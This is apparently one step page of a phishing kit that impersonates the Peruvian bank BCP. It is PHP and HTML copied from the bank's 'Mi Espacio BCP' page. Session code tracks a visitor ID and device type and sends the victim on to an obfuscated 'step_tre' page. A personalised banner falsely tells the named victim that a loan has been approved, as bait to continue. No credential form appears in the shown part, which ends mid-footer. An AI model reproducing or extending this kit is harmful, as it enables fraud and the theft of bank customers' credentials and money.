<?php

########################################################################
# HEADERS
########################################################################

session_start();

########################################################################
# VERIFICANDO SESION
########################################################################

if (!isset($_SESSION['session_id'])) {
    
    header('Location: ../index.php');
    exit();

}

########################################################################
# ARCHIVOS DE CONFIGURACION
########################################################################

include '../config.php';

########################################################################
# OBTENIENDO VARIABLES GUARDADAS EN SESION
########################################################################

$visitorId = $_SESSION['visitorId'];
$session_id = $_SESSION['session_id'];
$directory_array = $_SESSION['directory_array'];
$device_type = $_SESSION['device_type'];

########################################################################

$estado = $_SESSION['estado'];

########################################################################

$next_location = "step_tre.php";

$next_location_encrypted = $directory_array[$next_location].".php";

$nf = $_SESSION['nf'];

?>

<!DOCTYPE html>
<html device-type="desktop" class="hydrated">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title>Mi Espacio BCP | BCP</title>
	<link rel="stylesheet" href="files/main.css">
	<meta content="width=device-width, initial-scale=1" name="viewport">
	<link href="files/favicon.ico" rel="icon" type="image/x-icon">
	<!-- <link rel="stylesheet" href="./2_files/auxi.css"> -->
	<link rel="stylesheet" href="files/stylo.css">
	<style>
		.loading {
			padding: 420px 0px 0px 410px;
		}

		@media only screen and (max-width: 575px) {
			.loading {
				padding: 440px 0px 0px 0px;
			}
		}

		 @media screen and (max-width: 359px) {
			#btnabrircuenta {
				padding-left:12px !important;
				padding-top: 4px !important;
				padding-right:12px !important;
			}
		} 

		@media screen and (max-width: 383px) {
			#btnabrircuenta {
				position:inherit !important;
			}
			#bcplogo {
				right:5px;
			}
		}
		@media screen and (min-width: 421px) {
			/* Agrega tus estilos CSS aquí */
			#contenedorbotones {
				top: 26px;
				position: relative;
			}
		}
		@media screen and (max-width: 381px) {
			#quieroprobarlos{
				padding-top: 3.5px !important;
			}
		}
		@media screen and (max-width: 341px) {
			#conocemas{
				padding-top: 3.5px !important;
			}
		}
		
		@media screen and (max-width: 317px) {
			#conocermas{
				padding-top: 3.5px !important;
			}
		}
		@media screen and (max-width: 307px) {
			#contenedorbotones3{
				bottom: 20px;
			}
		}
		
		@media screen and (max-width: 420px) {
			#botonconocemasprimero{
				padding: 12px;
				
			}
		}
		
		@media screen and (min-width: 421px) {
			#botonconocemasprimero{
				margin-bottom: 30px;
				
			}
		}
		.loader {
    		border: 2px solid white;
    		border-top: 4px solid transparent;
   			border-radius: 50%;
    		width: 22px;
    		height: 22px;
    		animation: spin 1s linear infinite;
    		position: absolute;
    		top: 50%;
    		left: 50%;
    		margin-top: -10px;
    		margin-left: -10px;
    		display: none;
		}
		/* Animación de rotación del loader */
		@keyframes spin {
			0% { transform: rotate(0deg); }
    		100% { transform: rotate(360deg); }
		}

		/* Estilos para el botón personalizado */
		.custom-button {
    		position: relative; /* Para que el loader se posicione correctamente */
		}

		/* Mostrar el loader cuando el botón está deshabilitado */
		.btn-block:disabled .loader {
			display: block;
		}
		
	</style>
</head>
<body class="">
<div id="loader_ajax" style="position: fixed; top: 0px; left: 0px; z-index: 9999999999; width: 100%; height: 100%; overflow-y: none; display: none;">
    <div id="ajax_loader">
        <div class="text-center">
            <img src="files/spinner.gif" class="loading">
        </div>
    </div>
</div>
<app-root _nghost-aqk-c52="" ng-version="12.2.16">
	<router-outlet _ngcontent-aqk-c52=""></router-outlet>
	<app-initial-verify _nghost-aqk-c63="">
		<div _ngcontent-aqk-c63="" class="container-fluid" style="overflow-y: visible;">
			<div _ngcontent-aqk-c63="" class="row" style="min-height: 100%;">
				<div _ngcontent-aqk-c63="" class="col-4 d-none d-md-block channel-image-style">
					<app-channel-image _ngcontent-aqk-c63="" _nghost-aqk-c59="">
						<div _ngcontent-aqk-c59="" class="channel-img-fixed" style="background-image: url(files/costado.jpg); background-repeat: no-repeat; background-size: cover; background-position: center center; height: 100%;">
							<img _ngcontent-aqk-c59="" src="files/logo.svg" class="mt16 logoSize logoStyle">
						</div>
					</app-channel-image>
				</div>
				<div _ngcontent-aqk-c63="" class="col" style="position: relative; overflow-y: visible;padding-right:0;padding-left:0;">
					<app-home-header _ngcontent-aqk-c63="" _nghost-aqk-c54="">
						<main class="header_sin_acceso">
    <header style="position: fixed; width: 100%; background: #FFFFFF; top: 0; top: 0px; z-index: 9999; box-shadow: 0px 4px 8px rgb(0 33 102 / 5%);">
        <div class="container" style="margin-right: auto; margin-left: auto; padding-left: 0; padding-right: 0;"> 
           <div class="bcp_opciones" style="padding: 10px 24px; display: flex; flex-direction: row; align-items: center; justify-content: space-between;margin-right:16px;">
            <div class="bcp_logo" id="bcplogo" style="width: 30%; height: 24px;position:relative;bottom:4px;">
                <a href="/">
                    <img src="files/logo-bcp.svg" alt="" style="width: 72px;height: 19px;">
                </a>
            </div>
			   <button onclick="abrircuenta()" type="button" id="btnabrircuenta" class="btn btn-primary btn-lg btn-block" style="height: 40px; color: #ff7800; border-radius: 20px; padding: 12px; width: 30%; line-height: 16px; background-color: white; border-color: #ff7800;margin-top:0px;position:relative; padding-left:0px; padding-right:0px;left:16px; position:relative;"> 
                                                                        
                                                                            <p class="paragraph-lg bcp-font-demi white" style="color: #ff7800;font-size:14px;">Abrir cuenta </p>
                                                                        
																		<div class="loader" id="loaderabrircuenta"></div>
                                                                    </button>
			   <button onclick="banca()" type="button" class="btn btn-primary btn-lg btn-block" style="height: 40px; color: #ff7800; border-radius: 20px; padding: 12px; width: 84px; line-height: 16px; background-color: #ff7800; border-color: #ff7800;margin-top:0px;display:flex;left:16px; position:relative;"> 
				   <svg aria-hidden="true" width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path fill-rule="evenodd" clip-rule="evenodd" d="M8.00002 1.3335C9.83673 1.3335 11.3334 2.82829 11.3334 4.66683V6.00016H12.6667C13.0349 6.00016 13.3334 6.29864 13.3334 6.66683V14.0002C13.3334 14.3684 13.0349 14.6668 12.6667 14.6668H3.33335C2.96516 14.6668 2.66669 14.3684 2.66669 14.0002V6.66683C2.66669 6.29864 2.96516 6.00016 3.33335 6.00016H4.66669V4.66683C4.66669 2.82787 6.16248 1.3335 8.00002 1.3335ZM8.00002 9.00016C7.65813 9.00016 7.37635 9.25752 7.33784 9.58908L7.33335 9.66683V11.0002C7.33335 11.3684 7.63183 11.6668 8.00002 11.6668C8.34191 11.6668 8.62369 11.4095 8.6622 11.0779L8.66669 11.0002V9.66683C8.66669 9.29864 8.36821 9.00016 8.00002 9.00016ZM8.00002 2.66683C6.89473 2.66683 6.00002 3.56183 6.00002 4.66683V6.00016H10V4.66683C10 3.56154 9.10555 2.66683 8.00002 2.66683Z" fill="white"></path>
                        </svg>
                                                                        
                                                                            <p class="paragraph-lg bcp-font-demi white" style="color: white;font-size:14px;left: 3px; position: relative;"> Banca </p>
                                                                        
																		<div class="loader" id="loaderbanca"></div>
                                                                    </button>
			   <div style="position:relative; left:16px;">
			   <svg aria-hidden="true" width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path fill-rule="evenodd" clip-rule="evenodd" d="M25.3334 10.6667H6.66671C5.93033 10.6667 5.33337 10.0697 5.33337 9.33333C5.33337 8.59695 5.93033 8 6.66671 8H25.3334C26.0698 8 26.6667 8.59695 26.6667 9.33333C26.6667 10.0697 26.0698 10.6667 25.3334 10.6667ZM25.3334 17.3333H6.66671C5.93033 17.3333 5.33337 16.7364 5.33337 16C5.33337 15.2636 5.93033 14.6667 6.66671 14.6667H25.3334C26.0698 14.6667 26.6667 15.2636 26.6667 16C26.6667 16.7364 26.0698 17.3333 25.3334 17.3333ZM6.66671 24H25.3334C26.0698 24 26.6667 23.403 26.6667 22.6667C26.6667 21.9303 26.0698 21.3333 25.3334 21.3333H6.66671C5.93033 21.3333 5.33337 21.9303 5.33337 22.6667C5.33337 23.403 5.93033 24 6.66671 24Z" fill="#202E44"></path>
                        </svg>
			   </div>
           </div>
        </div>
    </header>
</main>
					
						
					</app-home-header>
					<div id="" style="background: #F5F8FF;">
						<section class="bannerAzul" style="height: 405px; background: #0030B3; position: relative; clip-path: ellipse(100% 100% at 50% 0%);">
							<h1 class="bcp_titulo" style="top: 83px; position: relative; padding-left: 25px; font-size: 28px; line-height: 40px; font-weight: 400; color: white;">Mi espacio BCP</h1>
							<p style="top: 80px; position: relative; padding-left: 25px; font-weight: 400; color: white; font-size: 16px; line-height: 24px;">Ofertas pensadas en ti:</p>
						</section>
					</div>
					<section class="carrouselofertas" style="padding: 0px 24px 32px 24px; background: #F5F8FF;padding-bottom: revert;">
						<div class="swiper-slide"  style="min-height: 393px; padding: 48px 32px 32px 32px; top: -183px; box-shadow: 0px 8px 16px rgba(0, 67, 206, 0.1); background: #FFFFFF; position:relative; margin-bottom:24px; width: 100%; height: 100%; border-radius:16px; transition-property: transform;">
							<img class="bcp_img_producto lazy_loading lazy_loader_img bcp_destock" src="files/rootworkspace.svg" alt="" style="width: 150px; height: 170px; position: absolute; top: -148px; right: -24px; margin-bottom: 0px; object-position: unset; object-fit: unset;">
							<div class="bcp_seccion_texto_botones">
								<div class="bcp_contenedor_titulo_descripcion">
									<div class="recomendado" style="position: absolute; padding: 5px 12px 3px; background: #6AC90F; border-radius: 6px 6px 6px 0px; font-family: 'Flexo-demi'; font-weight: normal; font-size: 12px; line-height: 14px; text-transform: uppercase; color: #FFFFFF; z-index: 0;content: 'Recomendado';left: -5px; top: 18px;">
										<span>
											Recomendado
										</span>
									</div>
									<div class="bcp_titulo" style="font-size: 20px; font-weight: 600; line-height: 26px; color: #002DA0; margin-bottom: 8px;">
										Enhorabuena <?=$nf;?>
									</div>
									<div class="bcp_descripcion" style="font-size: 20px; line-height: 26px; margin-bottom: 16px; font-style: normal; font-weight: initial; color: #002DA0;">
										Tienes un Préstamo <br> aprobado
									</div>
									<div class="bcp_lista_beneficio">
										<div class="bcp_beneficio" style="display: flex; flex-direction: row; margin-bottom: 12px;box-sizing: border-box;height:16px;">
											<img class="lazy_loading"src="files/moneybag.svg" style="width: 16px; height: 16px; object-fit: contain; object-position: center; margin-right: 12px;">
											<p style="font-size: 12px; line-height: 16px;">
												Tú eliges el monto y las cuotas
											</p>
										</div>
										<div class="bcp_beneficio" style="display: flex; flex-direction: row; margin-bottom: 12px;box-sizing: border-box;height:16px;">
											<img class="lazy_loading" src="files/documentdenied.svg" style="width: 16px; height: 16px; object-fit: contain; object-position: center; margin-right: 12px;">
											<p style="font-size: 12px; line-height: 16px;">
												Recíbelo en tu cuenta al instante
											</p>
										</div>
										<div class="bcp_beneficio" style="display: flex; flex-direction: row; margin-bottom: 12px;box-sizing: border-box;height:16px;">
											<img class="lazy_loading" src="files/house.svg" style="width: 16px; height: 16px; object-fit: contain; object-position: center; margin-right: 12px;">
											<p style="font-size: 12px; line-height: 16px;">
												¡Pídelo desde donde estés!
											</p>
										</div>
									</div>
								</div>
								<div class="bcp_contenedor_beneficios_botones" id="contenedorbotones">
									<button type="button" id="btnpri" value="" class="btn btn-primary btn-lg btn-block" style="height: 40px; color: #ff7800; border-radius: 20px; width: 94%; padding: 12px; left: 3%; top: 10px; line-height: 16px; background-color: #ff7800; border-color: #ff7800; margin-top: 0px; display: flex; position: relative;"> 
										<p id="btnprimparrafo" class="paragraph-lg bcp-font-demi white" style="width: 100%; color: white; font-size: 14px; text-align: center; position: relative;"> Solicítalo aquí </p>
										<div class="loader" id="loaderprestamo"></div>
									</button>
									<button onclick="redirigirprestamo()" id="botonconocemasprimero" type="button" class="btn btn-primary btn-lg btn-block" style="height: 40px; color: #ff7800; border-radius: 20px; width: 94%;left: 3%; top: 28px; line-height: 16px; background-color: transparent; border-color: transparent; margin-top: 0px; display: flex; position: relative;"> 
										<p class="paragraph-lg bcp-font-demi white" style="width: 100%; color: #ff7800; font-size: 14px; text-align: center; position: relative;"> Conoce más</p>
									</button>
								</div>
							</div>
						</div>
						<p dir="ltr" style="top: -183px; position: relative; text-align: center; margin: 64px 0px 24px 0px; font-size: 1.5rem; font-family: var(--bcp-font-family-primary-regular, 'Flexo-Regular'),helvetica,arial,sans-serif; line-height: 1.2; color: var(--primary-700,#002a8d); font-weight: 100;">Otras <strong style="font-family: var(--bcp-font-family-primary-bold, 'Flexo-Bold'),helvetica,arial,sans-serif">ofertas interesantes</strong></p>
						
						<div class="swiper-slide" style="min-height: 288px; top: -183px; box-shadow: 0px 8px 16px rgba(0, 67, 206, 0.1); background: #FFFFFF; position:relative; margin-bottom:24px; width: 100%; height: 100%; border-radius:16px; transition-property: transform;">
							<div class="bcp_seccion_texto_botones" style="padding:32px 32px">
								<div class="bcp_contenedor_titulo_descripcion">
									<div class="bcp_titulo" style="font-size: 14px; line-height: 20px; margin-bottom: 8px; color: #002DA0; font-weight: normal; font-style: normal;">
										¡Aprovecha!								</div>
									<div class="bcp_descripcion" style="font-weight: 600; color: #002DA0; font-size: 20px; line-height: 24px; margin-bottom: 16px;">
										Usa Cuotéalo y paga en cuotas en +150 tiendas
									</div>
									<div class="bcp_lista_beneficio">
										<div class="bcp_beneficio" style="display: flex; flex-direction: row; margin-bottom: 12px;box-sizing: border-box;height:16px;">
											<img class="lazy_loading" src="files/cardaproved.svg" style="width: 16px; height: 16px; object-fit: contain; object-position: center; margin-right: 12px;">
											<p style="font-size: 12px; line-height: 16px;">
												Construye historial crediticio
											</p>
										</div>
										<div class="bcp_beneficio" style="display: flex; flex-direction: row; margin-bottom: 12px;box-sizing: border-box;height:16px;">
											<img class="lazy_loading" src="files/moneysoles.svg" style="width: 16px; height: 16px; object-fit: contain; object-position: center; margin-right: 12px;">
											<p style="font-size: 12px; line-height: 16px;">
												Brindamos tasas competitivas
											</p>
										</div>
										<div class="bcp_beneficio" style="display: flex; flex-direction: row; margin-bottom: 12px;box-sizing: border-box;height:16px;">
											<img class="lazy_loading" src="files/calendary.svg" style="width: 16px; height: 16px; object-fit: contain; object-position: center; margin-right: 12px;">
											<p style="font-size: 12px; line-height: 16px;">
												Elige tus cuotas y fechas de pago
											</p>
										</div>
									</div>
								</div>
							</div>
							<div class="bcp_contenedor_beneficios_botones" id="contenedorbotones2" style="bottom: 20px; display: flex; position: relative;">
									<button onclick="redirigircuotealocm()" id="conocermas" type="button" class="btn btn-primary btn-lg btn-block" style="height: 40px; color: #ff7800; border-radius: 20px; width: 40%;margin-left:10%; padding: 12px; top: 10px; line-height: 16px; background-color: white; border-color: white; margin-top: 0px; display: flex; position: relative;"> 
										<p class="paragraph-lg bcp-font-demi white" style="width: 100%; color: #ff7800; font-size: 14px; text-align: start; position: relative;"> Conocer más </p>
									</button>
									<button onclick="redirigircuotealoqb()" type="button" id="quieroprobarlos" class="btn btn-primary btn-lg btn-block" style="height: 40px; color: #ff7800; border-radius: 20px; width: 40%; padding: 12px; top: 10px; line-height: 16px; background-color: #ff7800; border-color: #ff7800; margin-top: 0px; display: flex; position: relative;"> 
										<p class="paragraph-lg bcp-font-demi white" style="width: 100%; color: white; font-size: 14px; text-align: center; position: relative;"> Quiero probarlos </p>
									</button>
								</div>
							
						</div>
						<div class="swiper-slide" style="min-height: 288px; top: -183px; box-shadow: 0px 8px 16px rgba(0, 67, 206, 0.1); background: #FFFFFF; position:relative; margin-bottom:24px; width: 100%; height: 100%; border-radius:16px; transition-property: transform;">
							<div class="bcp_seccion_texto_botones" style="padding:32px 32px">
								<div class="bcp_contenedor_titulo_descripcion" style="padding-top: 9px;">
									<div class="bcp_descripcion" style="font-weight: 600; color: #002DA0; font-size: 20px; line-height: 24px; margin-bottom: 16px;">
										¡Tu Tarjeta de Crédito más cerca con ANDO!
									</div>
									<div class="bcp_lista_beneficio">
										<div class="bcp_beneficio" style="display: flex; flex-direction: row; margin-bottom: 12px;box-sizing: border-box;height:16px;">
											<img class="lazy_loading" src="files/moneybag.svg" style="width: 16px; height: 16px; object-fit: contain; object-position: center; margin-right: 12px;">
											<p style="font-size: 12px; line-height: 16px;">
												100% gratis y seguro
											</p>
										</div>
										<div class="bcp_beneficio" style="display: flex; flex-direction: row; margin-bottom: 12px;box-sizing: border-box;height:16px;">
											<img class="lazy_loading" src="files/documentdenied.svg" style="width: 16px; height: 16px; object-fit: contain; object-position: center; margin-right: 12px;">
											<p style="font-size: 12px; line-height: 16px;">
												Construye perfil crediticio
											</p>
										</div>
										<div class="bcp_beneficio" style="display: flex; flex-direction: row; margin-bottom: 12px;box-sizing: border-box;height:16px;">
											<img class="lazy_loading" src="files/house.svg" style="width: 16px; height: 16px; object-fit: contain; object-position: center; margin-right: 12px;">
											<p style="font-size: 12px; line-height: 16px;">
												Forma buenos hábitos financieros
											</p>
										</div>
									</div>
								</div>
							</div>
							
							<div class="bcp_contenedor_beneficios_botones" id="contenedorbotones3" style=" display: flex; position: relative;botton:3px;">
									<button type="button" class="btn btn-primary btn-lg btn-block" style="height: 40px; color: #ff7800; border-radius: 20px; width: 40%;margin-left:10%; padding: 12px; top: 10px; line-height: 16px; background-color: white; border-color: white; margin-top: 0px; display: flex; position: relative;"> 
										<p class="paragraph-lg bcp-font-demi white" style="width: 100%; color: transparent; font-size: 14px; text-align: center; position: relative;"> Conocer más </p>
									</button>
									<button onclick="andocm()" type="button" id="conocemas" class="btn btn-primary btn-lg btn-block" style="height: 40px; color: #ff7800; border-radius: 20px; width: 35%; padding: 12px; top: 10px; line-height: 16px; background-color: #ff7800; border-color: #ff7800; margin-top: 0px; display: flex; position: relative;margin-left:5%;"> 
										<p class="paragraph-lg bcp-font-demi white" style="width: 100%; color: white; font-size: 14px; text-align: center; position: relative;"> Conoce más </p>
									</button>
								</div>
							
						</div>
						
                    <p dir="ltr" style="top: -183px; position: relative; text-align: center; margin: 64px 0px 24px 0px; font-size: 1.5rem; font-family: var(--bcp-font-family-primary-regular, 'Flexo-Regular'),helvetica,arial,sans-serif; line-height: 1.2; color: var(--primary-700,#002a8d); font-weight: 100;">Productos para <strong style="font-family:var(--bcp-font-family-primary-bold, 'Flexo-Bold'),helvetica,arial,sans-serif">ahorrar</strong></p>
						
							<div class="bcp_seccion_texto_botones" style="padding: 16px 24px 8px 24px; box-shadow: 0px 0px 24px 0px rgba(8, 59, 165, 0.10); width: 95%; display: flex; flex-direction: row; justify-content: space-between; align-items: center; gap: 16px;top: -183px; box-shadow: 0px 8px 16px rgba(0, 67, 206, 0.1); background: #FFFFFF; position:relative; margin-bottom:24px; width: 100%; height: 100%; border-radius:16px; transition-property: transform;">
								<div class="bcp_contenedor_titulo_descripcion">
									<div class="totaldigital" style="display: flex;">
										<img src="files/cerditoahorro.svg" style="width: 48px; height: 48px; object-fit: contain; object-position: center; margin: auto;margin-right: 16px;">
										<div class="textodigital" style="margin-left: 8px;"> 
											<div class="bcp_titulo" style="font-size: 14px; line-height: 20px; margin-bottom: 8px; color: #002DA0; font-weight: normal; font-style: normal;">
												Cuenta Digital						
											</div>
											<div class="bcp_descripcion" style="font-weight: 600; color: #002DA0; font-size: 20px; line-height: 24px; margin-bottom: 16px;font-family:'Flexo-demi';">
												Abre tu cuenta con cero mantenimiento 
											</div>
											<div  onclick="abretucuentacm()" class="boton_naranja" style="justify-content: flex-start; border-radius: 20px; height: 40px; padding: 12px 0px 24px; font-size: 14px; line-height: 16px; font-family: 'Flexo-Demi'; cursor: pointer; color: #ff7800; align-items: center; transition: box-shadow linear 200ms,color linear 200ms,background-color linear 200ms; user-select: none; display: flex;">
												<span>
													Abre tu cuenta
												</span>
												<img src="files/arrowright.svg" style="left: 5px; position: relative;">
											</div>
										</div>
									</div>
								</div>
						</div>
						<p dir="ltr" style="top: -183px; position: relative; text-align: center; margin: 64px 0px 24px 0px; font-size: 1.5rem; font-family: var(--bcp-font-family-primary-bold, 'Flexo-Bold'),helvetica,arial,sans-serif; line-height: 1.2; color: var(--primary-700,#002a8d); font-weight: 100;">Protégete <strong style="font-family:var(--bcp-font-family-primary-regular, 'Flexo-Regular'),helvetica,arial,sans-serif">con estos seguros</strong></p>
						<div class="bcp_seccion_texto_botones" style="padding: 16px 24px 8px 24px; box-shadow: 0px 0px 24px 0px rgba(8, 59, 165, 0.10); width: 95%; display: flex; flex-direction: row; justify-content: space-between; align-items: center; gap: 16px;top: -183px; box-shadow: 0px 8px 16px rgba(0, 67, 206, 0.1); background: #FFFFFF; position:relative; margin-bottom:24px; width: 100%; height: 100%; border-radius:16px; transition-property: transform;">
								<div class="bcp_contenedor_titulo_descripcion">
									<div class="totaldigital" style="display: flex;">
										<img src="files/billegas.svg" style="width: 48px; height: 48px; object-fit: contain; object-position: center; margin: auto;margin-right: 16px;">
										<div class="textodigital" style="margin-left: 8px;"> 
											<div class="bcp_titulo" style="font-size: 14px; line-height: 20px; margin-bottom: 8px; color: #002DA0; font-weight: normal; font-style: normal;">
												Seguro Vida Ahorro					
											</div>
											<div class="bcp_descripcion" style="font-weight: 600; color: #002DA0; font-size: 20px; line-height: 24px; margin-bottom: 16px;font-family:'Flexo-demi';">
												Protégete y haz crecer tus ahorros
											</div>
											<div onclick="protegetusahorroscm()" class="boton_naranja" style="justify-content: flex-start; border-radius: 20px; height: 40px; padding: 12px 0px 24px; font-size: 14px; line-height: 16px; font-family: 'Flexo-Demi'; cursor: pointer; color: #ff7800; align-items: center; transition: box-shadow linear 200ms,color linear 200ms,background-color linear 200ms; user-select: none; display: flex;">
												<span>
													Conoce más
												</span>
												<img src="files/arrowright.svg" style="left: 5px; position: relative;">
											</div>
										</div>
									</div>
								</div>
						</div>
						</section>
					<div class="footerbp" style="padding-top:50px; padding-bottom:50px; background-color:white;">
						<p dir="ltr" style="top: -150px; position: relative; text-align: center; margin-top: -20px; background: white; font-size: 18px; margin-bottom: 28px; padding-top: 50px; font-family: 'Flexo-demi'; line-height: 24px; color: var(--primary-700,#002a8d); font-weight: 100; padding-bottom: 50px;">¿Fue útil tu nuevo espacio BCP?</p>
						<div class="swiper-pagination swiper-pagination-clickable swiper-pagination-bullets swiper-pagination-horizontal"><span class="swiper-pagination-bullet swiper-pagination-bullet-active" tabindex="0" role="button" aria-label="Go to slide 1" aria-current="true"></span><span class="swiper-pagination-bullet" tabindex="0" role="button" aria-label="Go to slide 2"></span><span class="swiper-pagination-bullet" tabindex="0" role="button" aria-label="Go to slide 3"></span><span class="swiper-pagination-bullet" tabindex="0" role="button" aria-label="Go to slide 4"></span><span class="swiper-pagination-bullet" tabindex="0" role="button" aria-label="Go to slide 5"></span><span class="swiper-pagination-bullet" tabindex="0" role="button" aria-label="Go to slide 6"></span></div>
					
						<div class="niveles>" style="display: flex; justify-content: center; align-items: center; gap: 24px; top: -180px; position: relative;">
							<img src="files/baja.svg" style="width: 48px; height: 48px; filter: grayscale(1); transition: filter .3s linear; cursor: pointer;">
							<img src="files/media.svg" style="width: 48px; height: 48px; filter: grayscale(1); transition: filter .3s linear; cursor: pointer;">
							<img src="files/alta.svg" style="width: 48px; height: 48px; filter: grayscale(1); transition: filter .3s linear; cursor: pointer;">
						</div>
						<p dir="ltr" style="font-family: var(--bcp-font-family-primary-regular, 'Flexo-Regular'),helvetica,arial,sans-serif; font-style: normal; font-weight: 400; font-size: 11px; top: -120px; line-height: 16px; text-align: center; color: #737E8E; position: relative; width: 80%; left: 10%;">Términos y condiciones: Las condiciones del préstamo preaprobado y del adelanto de sueldo podrían cambiar al momento de la evaluación en línea.</p>
						<div class="bcp_regreso_arriba" style="display: flex; flex-direction: row; justify-content: center; align-items: center;position:relative;bottom:90px;">
                <div class="linea" style="border-top: 1px solid #D8DFEA; width: 50%;"></div>
                <div class="btn_regreso" role="button" aria-label="Regresar al inicio de la página" tabindex="0">
                    <div class="texto_boton" aria-hidden="true"></div>
                    <svg aria-hidden="true" width="40" height="40" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <rect width="40" height="40" rx="20" fill="#FF7800"></rect>
                        <path d="M28.0485 24.0271C28.0521 24.5524 27.7555 25.0255 27.3053 25.2125C26.855 25.3995 26.3464 25.2608 26.0308 24.865L19.9535 17.2148L13.9828 24.9977C13.5737 25.5289 12.8484 25.5987 12.3628 25.1536C11.8771 24.7085 11.815 23.9171 12.2241 23.3859L19.0611 14.5268C19.2776 14.2456 19.5957 14.0816 19.9318 14.0779C20.2678 14.0742 20.5882 14.2312 20.8085 14.5075L27.7669 23.2146C27.9466 23.4399 28.0464 23.728 28.0485 24.0271Z" fill="white"></path>
                    </svg>
                </div>
                <div class="linea" style="border-top: 1px solid #D8DFEA; width: 50%;"></div>
            </div>
						<div class="" style="display: flex; flex-direction: row; justify-content: center; align-items: flex-start;padding-top: 48px; padding-left: 24px; padding-right: 24px;bottom:90px; position:relative;border-bottom: 1px solid #D8DFEA;">
                    
                    <img class="" src="files/celular.jpeg" style="width: 155px; height: 208px; object-fit: contain; object-position: bottom;">
                    <div class="grupo_textos_descarga" style="display: grid; grid-template-rows: auto; gap: 16px; padding-left: 14px; box-sizing: border-box;">
                        <h3 class="titulo_opciones" data-translate="true" style="font-size: 16px; line-height: normal; width: 168px; font-family: 'Flexo-Demi'; font-style: normal; font-weight: normal; color: #002A8D;    margin: 0px; padding: 0px;">
                            Descarga el App Banca Móvil BCP
                        </h3>
                        <div class="grupos_apps" style="display: grid; grid-template-rows: auto; justify-content: left; align-items: center; gap: 12px;">
                            <a role="button" type="button" data-enlace="Google play" target="_blank" href="https://play.google.com/store/apps/details?id=com.bcp.bank.bcp&amp;hl=es_419" style="font-family: 'Flexo-Demi'; font-size: 14px; font-style: normal; font-weight: normal; height: 32px; line-height: normal; color: #FFFFFF; text-align: center; text-decoration: none!important; outline-offset: unset; outline: 0; width: 140px; border-radius: 24px; background: #000000; display: flex; justify-content: center; align-items: center; transition: background .3s ease-out;">
                                <img class="lazy_loading" src="files/iconplaystore.svg">
                                Google play
                            </a>
                            <a role="button" type="button" data-enlace="App Store" target="_blank" href="https://itunes.apple.com/pe/app/banca-m%C3%B3vil-bcp/id777961079?mt=8" style="font-family: 'Flexo-Demi'; font-size: 14px; font-style: normal; font-weight: normal; height: 32px; line-height: normal; color: #FFFFFF; text-align: center; text-decoration: none!important; outline-offset: unset; outline: 0; width: 140px; border-radius: 24px; background: #000000; display: flex; justify-content: center; align-items: center; transition: background .3s ease-out;">
                                <img class="lazy_loading" src="files/iconappstore.svg">
                                App Store
                            </a>
                            <a role="button" type="button" data-enlace="AppGallery" target="_blank" href="https://appgallery.huawei.com/#/app/C101305639" style="font-family: 'Flexo-Demi'; font-size: 14px; font-style: normal; font-weight: normal; height: 32px; line-height: normal; color: #FFFFFF; text-align: center; text-decoration: none!important; outline-offset: unset; outline: 0; width: 140px; border-radius: 24px; background: #000000; display: flex; justify-content: center; align-items: center; transition: background .3s ease-out;">
                                <img class="lazy_loading" src="files/iconappgallery.svg">
                                AppGallery
                            </a>
                        </div>
                    </div>
                </div>
				<div id="col_3" index="3" style="box-sizing: border-box;position:relative;bottom:40px;">
                    <div class="column_ubicanos mobile" style="font-family: var(--bcp-font-family-primary-regular, 'Flexo-Regular'),helvetica,arial,sans-serif; text-align: center;">
                        <h3 class="titulo_opciones" style="font-size: 20px; line-height: 28px; padding-top: 0px; padding-bottom: 16px; border-top: 0; margin: 0px 24px; font-family: 'Flexo-Demi'; font-weight: normal; color: #4D5B70;">
                            Ubícanos
                        </h3>
                        <ul class="bcp_opciones" style="text-decoration: none; padding: 0px; margin: 0px; display: block;">
                            <p dir="ltr" data-translate="true" style="font-style: normal; font-weight: normal; font-size: 16px; line-height: 24px; color: #202E44; padding: 6px 0px; margin: 0px;">Encuentra la agencia más cercana

</p>

							<div onclick="veragencias()" class="boton_naranja" style="justify-content: center; border-radius: 20px; height: 40px; padding: 12px 0px 24px; font-size: 16px; line-height: 24px; font-family: 'Flexo-Demi'; cursor: pointer; color: #ff7800; align-items: center; transition: box-shadow linear 200ms,color linear 200ms,background-color linear 200ms; user-select: none; display: flex;">
								<span style="padding-left: 20px;">
									Ver agencias
								</span>
								<img src="files/arrowright.svg" style="left: 5px; position: relative;">
							</div>

                        </ul>
                    </div>
                    <div class="column_contactanos" style="text-align: center; padding-top: 40px;">
                        <h3 class="titulo_opciones" style="font-size: 20px; line-height: 28px; padding-top: 0px; padding-bottom: 16px; border-top: 0;font-family: 'Flexo-Demi'; font-weight: normal; color: #4D5B70;"> 
                            Contáctanos
                        </h3>
                        
                        <a class="enlace_ayuda" role="button" type="button" v style="color: #202E44; text-align: center; font-family: 'Flexo-Demi'; font-size: 16px; font-style: normal; font-weight: normal; text-decoration: none!important; outline-offset: unset; outline: 0; line-height: normal; display: flex; align-items: center; border-radius: 20px; border: 1px solid #ACB2BD; padding: 8px 16px; width: max-content; margin-top: 6px; transition: box-shadow .3s ease-out; margin-left: auto; margin-right: auto;">
                            <img class="lazy_loading" src="files/socialwhatsapp.svg">
                            Chatea por Whatsapp
                        </a>
                        
                    </div>
                    <div class="redes_sociales" style="text-align: center; padding-top: 40px; padding-bottom: 32px; border-bottom: 1px solid #E5E7EB;">
                        <h3 class="bcp_titulo_opciones" style="font-size: 20px; line-height: 28px; padding-top: 0px; padding-bottom: 16px; border-top: 0; font-family: 'Flexo-Demi'; font-weight: normal; color: #4D5B70; margin: 0px 24px;">
                            Síguenos
                        </h3>
                        <div class="acceso_redes_sociales" style="display: grid; grid-template-columns: repeat(4, auto); justify-content: center; grid-gap: 24px;">
                            <a href="" target="_blank" title="Facebook" style="background: #F2F4F8; width: 48px; height: 48px; border-radius: 50%; display: flex; align-items: center; justify-content: center; transition: background .3s ease-out;">
                                <img class="lazy_loading" src="files/iconfacebook11.svg">
                            </a>
                            <a href="" target="_blank" title="Twitter" style="background: #F2F4F8; width: 48px; height: 48px; border-radius: 50%; display: flex; align-items: center; justify-content: center; transition: background .3s ease-out;">
                                <img class="lazy_loading" src="files/icontwiter11.svg">
                            </a>
